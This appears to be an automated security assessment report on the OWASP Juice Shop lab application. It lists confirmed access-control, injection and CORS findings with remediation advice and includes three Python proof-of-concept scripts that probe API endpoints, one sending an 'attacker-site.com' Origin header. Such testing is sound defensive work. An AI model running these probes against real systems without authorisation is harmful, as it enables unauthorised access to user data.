executive_summary.narrative:
53 hypotheses tested, 13 proven and reported. Unproven candidates are in the raw artifacts, not shown as findings.

The assessment revealed critical vulnerabilities exposing administrative functions and sensitive user data without requiring authentication. Top priority should be securing administrative APIs and memory storage endpoints which currently leak credentials and system configurations. Several findings demonstrate overlapping access control failures across different API paths, suggesting systemic issues with security policy enforcement. These verified exploits carry high confidence due to multiple independent confirmation techniques used during testing.

findings.title: Unauthenticated Administrative Configuration Access
findings.status: confirmed exploitable (2 proof(s); merged from 2 hypotheses)
findings.recommendation: Attackers can access and potentially modify sensitive administrative settings, leading to full system compromise. Implement strict role-based access control (RBAC) checks on all administrative endpoints. Ensure that only authenticated and authorized users can access /rest/admin/ paths. Add authentication validation to all routes under /rest/admin/.

findings.title: Unauthenticated User Memory Data Access
findings.status: confirmed exploitable (2 proof(s); merged from 2 hypotheses)
findings.recommendation: Exposes user credentials and personal information, creating opportunities for account takeover and identity theft. Immediately enforce strong authentication on /rest/memories/ endpoint. Hash passwords using industry-standard algorithms and salt values. Implement rate limiting and monitoring on sensitive endpoints to detect abuse attempts.

findings.title: Injection Vulnerabilities in Challenge API
findings.status: confirmed exploitable (2 proof(s); merged from 2 hypotheses)
findings.recommendation: Allows attackers to bypass filters, extract arbitrary data, and potentially gain deeper access to backend systems. Sanitize and validate all user-supplied input parameters before processing database queries. Implement content-type validation and reject unexpected input structures. Replace regex-based filtering with allow-list validation of accepted parameters.

findings.title: Unauthenticated Quantity Data Exposure
findings.status: confirmed exploitable (2 proof(s); merged from 2 hypotheses)
findings.recommendation: Sensitive inventory and business data is accessible to unauthenticated users, posing significant privacy and competitive risks. Enforce authentication and authorization on all API endpoints returning quantitative data. Apply object-level access control to ensure users can only view relevant records. Review all /api/ endpoints for similar access control weaknesses.

findings.title: Comprehensive Feedback API Security Issues
findings.status: confirmed exploitable (3 proof(s); merged from 3 hypotheses)
findings.recommendation: Exposes customer feedback, enables cross-site data theft, and reveals attack surface through verbose enumeration capabilities. Remove wildcard CORS headers and implement origin allow-list checking. Enforce proper authentication and authorization on /api/Feedbacks/. Disable unnecessary HTTP methods and suppress detailed error responses in production environments.

import httpx
import json

target = "http://juice-shop:3000/api/Challenges/"

# Normal request
print("Making normal request...")
normal_resp = httpx.get(target)
print(f"Normal request status: {normal_resp.status_code}")
normal_data = normal_resp.json()
normal_count = len(normal_data.get('data', []))
print(f"Normal request returned {normal_count} challenges")

# Request with parameter pollution (multiple 'name' parameters)
print("\nMaking request with parameter pollution...")
# Using direct URL construction to add multiple name parameters
polluted_url = target + "?name=test1&name=test2"
polluted_resp = httpx.get(polluted_url)
print(f"Polluted request status: {polluted_resp.status_code}")

if polluted_resp.status_code == 200:
    try:
        polluted_data = polluted_resp.json()
        polluted_count = len(polluted_data.get('data', []))
        print(f"Polluted request returned {polluted_count} challenges")
        
        # Check if responses differ
        if normal_count != polluted_count:
            print(f"PROOF: Parameter pollution worked! Different number of results returned.")
            print(f"Normal: {normal_count}, Polluted: {polluted_count}")
        else:
            print("Checking for other differences in response content...")
            # Compare actual content
            if normal_data != polluted_data:
                print("PROOF: Parameter pollution worked! Response content differs.")
            else:
                print("No clear difference detected - trying different approach")
                
                # Try with different parameter values
                alt_polluted_url = target + "?name=&name=admin"
                alt_resp = httpx.get(alt_polluted_url)
                if alt_resp.status_code == 200:
                    alt_data = alt_resp.json()
                    if alt_data != normal_data:
                        print("PROOF: Parameter pollution with different values works!")
                        print(f"Difference in data length: {len(normal_data)} vs {len(alt_data)}")
    except Exception as e:
        print(f"Error parsing JSON response: {e}")
else:
    print(f"Request failed with status {polluted_resp.status_code}")
scripts.description: DONE: Parameter pollution with multiple 'name' parameters causes the API to return different challenge data (107 vs 0 results), demonstrating inconsistent parsing behavior that confirms the vulnerability.
scripts.remediation_pointer: Implement proper parameter validation and ensure only the first or last occurrence of a parameter is processed consistently.

import httpx
import json

# First try to access the bulk endpoint to see what data is exposed
print("=== Testing bulk endpoint access ===")
bulk_url = "http://juice-shop:3000/api/Quantitys/"
try:
    bulk_response = httpx.get(bulk_url)
    print(f"Bulk endpoint status code: {bulk_response.status_code}")
    if bulk_response.status_code == 200:
        print("Bulk endpoint accessible - exposing multiple records:")
        data = bulk_response.json()
        print(f"Number of records exposed: {len(data.get('data', []))}")
        if 'data' in data:
            # Show first few records as proof
            for i, record in enumerate(data['data'][:3]):
                print(f"Record {i+1}: {json.dumps(record, indent=2)}")
    else:
        print(f"Bulk endpoint returned: {bulk_response.status_code}")
except Exception as e:
    print(f"Error accessing bulk endpoint: {e}")

print("\n=== Testing individual record access ===")
# Now try accessing individual record (should be blocked)
individual_url = "http://juice-shop:3000/api/Quantitys/2"
try:
    individual_response = httpx.get(individual_url)
    print(f"Individual record status code: {individual_response.status_code}")
    if individual_response.status_code == 403:
        print("Individual record access properly blocked with 403")
        print(f"Response body: {individual_response.text}")
    else:
        print(f"Unexpected response: {individual_response.status_code}")
        print(f"Response body: {individual_response.text}")
except Exception as e:
    print(f"Error accessing individual record: {e}")

print("\n=== Vulnerability Analysis ===")
print("This demonstrates an IDOR pattern where:")
print("- Bulk data access is unrestricted")
print("- Individual record access is blocked")
print("- But the bulk exposure itself represents insecure direct object reference")
scripts.description: DONE: The script proves the IDOR vulnerability by demonstrating that the bulk /api/Quantitys/ endpoint exposes 46 quantity records without authentication while individual record access (/api/Quantitys/2) is properly blocked with a 403 error, confirming the insecure direct object reference pattern where bulk data exposure constitutes the security flaw.

import httpx

# Target URL
url = "http://juice-shop:3000/api/Feedbacks/"

# Setting an arbitrary origin header
headers = {
    "Origin": "https://attacker-site.com"
}

try:
    # Make the request
    response = httpx.get(url, headers=headers)
    
    # Check for the vulnerable CORS header
    acao_header = response.headers.get('Access-Control-Allow-Origin')
    
    print(f"Request URL: {url}")
    print(f"Response Status Code: {response.status_code}")
    print(f"Origin Header Sent: {headers['Origin']}")
    print(f"Access-Control-Allow-Origin Header: {acao_header}")
    
    # Confirm the vulnerability
    if acao_header == "*":
        print("\n[CORS MISCONFIGURATION DETECTED]")
        print("The server responds with 'Access-Control-Allow-Origin: *'")
        print("This allows ANY origin to access this endpoint")
        print("Sensitive data may be exposed to malicious websites")
    else:
        print("\nNo CORS misconfiguration detected")
        
except Exception as e:
    print(f"Error making request: {e}")
scripts.description: DONE: The script proves that the /api/Feedbacks/ endpoint has a CORS misconfiguration vulnerability, evidenced by the server responding with 'Access-Control-Allow-Origin: *' header when an arbitrary origin is sent in the request, allowing any website to access sensitive feedback data from users.
scripts.remediation_pointer: Configure the server to return specific trusted origins in the Access-Control-Allow-Origin header instead of using wildcard (*), and implement proper origin validation.
